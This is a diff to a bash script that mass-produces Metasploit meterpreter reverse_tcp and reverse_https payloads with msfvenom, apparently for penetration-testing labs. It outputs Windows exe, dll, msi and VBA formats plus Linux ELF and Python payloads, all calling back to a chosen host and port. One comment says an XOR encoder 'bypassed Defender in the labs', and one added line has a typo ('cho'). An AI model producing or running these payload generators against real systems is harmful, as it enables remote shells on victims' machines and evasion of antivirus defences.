@@ -75,14 +75,11 @@ echo "[+] Finished powershell payload!"
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f vbapplication -o vbapplication/reverse_tcp-x64-vbapplication.txt > /dev/null 2>&1
 echo "[+] Finished vbapplication payload!"
 
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f exe -o exe/reverse_tcp-x64-exe.exe > /dev/null 2>&1
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f exe -o exe/reverse_tcp-x64.exe > /dev/null 2>&1
 echo "[+] Finished exe payload!"
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f dll -o dll/reverse_tcp-x64-dll.dll > /dev/null 2>&1
 echo "[+] Finished dll payload!"
-
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf -o elf/reverse_tcp-x64-elf > /dev/null 2>&1
-echo "[+] Finished ELF payload!"
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f msi EXITFUNC=thread -e x64/xor_dynamic -o msi/reverse_tcp-x64-msi.msi > /dev/null 2>&1
 echo "[+] Finished msi payload!"
@@ -117,15 +114,28 @@ echo "[+] Finished exe payload!"
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f dll -o dll/reverse_https-x64-dll.dll > /dev/null 2>&1
 echo "[+] Finished dll payload!"
 
-msfvenom -p linux/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port -f elf -o elf/reverse_https-x64-elf > /dev/null 2>&1
-echo "[+] Finished ELF payload!"
-
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port -f msi EXITFUNC=thread -e x64/xor_dynamic -o msi/reverse_https-x64-msi.msi > /dev/null 2>&1
 echo "[+] Finished msi payload!"
 echo "    [!] This payload uses -e x64/xor_dynamic (bypassed Defender in the labs)!"
 
 echo ""
 echo "[*] Finished /windows/x64/meterpreter/reverse_https payloads!"
+echo "    [!] There is no reverse_https payload for ELF!"
+
+# ========================================= elf ========================================= #
+
+cho ""
+echo "================================================================================================"
+echo "#                     Generating linux/x64/meterpreter/reverse_tcp payloads                    #"
+echo "================================================================================================"
+echo ""
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf -o elf/reverse_tcp-x64-elf > /dev/null 2>&1
+echo "[+] Finished ELF payload!"
+
+echo ""
+echo "[*] Finished linux/x64/meterpreter/reverse_tcp payloads!"
+echo "    [!] There is no reverse_https payload for ELF!"
 
 # ========================================= python ========================================= #
 
@@ -137,6 +147,9 @@ echo ""
 
 msfvenom -p python/meterpreter/reverse_tcp_ssl LHOST=$ip LPORT=$port -f raw -o python/reverse_tcp_ssl.py > /dev/null 2>&1
 echo "[+] Finished Python payload!"
+
+echo ""
+echo "[*] Finished python/meterpreter/reverse_tcp_ssl payloads!"
 
 echo ""
 echo "[!] The payloads are complete!"
